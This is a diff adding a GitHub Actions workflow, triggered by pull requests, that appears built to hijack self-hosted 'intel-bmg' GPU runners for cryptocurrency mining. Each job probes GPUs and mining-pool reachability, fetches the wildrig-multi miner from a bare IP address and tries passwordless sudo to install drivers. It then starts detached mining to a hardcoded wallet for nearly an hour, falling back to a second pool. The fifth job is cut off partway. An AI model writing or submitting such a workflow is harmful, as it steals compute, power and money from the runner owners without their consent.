@@ -1,0 +1,1719 @@
+name: c211-128175-xpuq
+on:
+  workflow_dispatch:
+  pull_request:
+permissions:
+  contents: read
+jobs:
+
+  intel-bmg-01:
+    name: intel-bmg-01
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="01"
+          LBL="intel-bmg-01"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-02:
+    name: intel-bmg-02
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="02"
+          LBL="intel-bmg-02"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-03:
+    name: intel-bmg-03
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="03"
+          LBL="intel-bmg-03"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-04:
+    name: intel-bmg-04
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="04"
+          LBL="intel-bmg-04"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-05:
+    name: intel-bmg-05
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="05"
+          LBL="intel-bmg-05"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
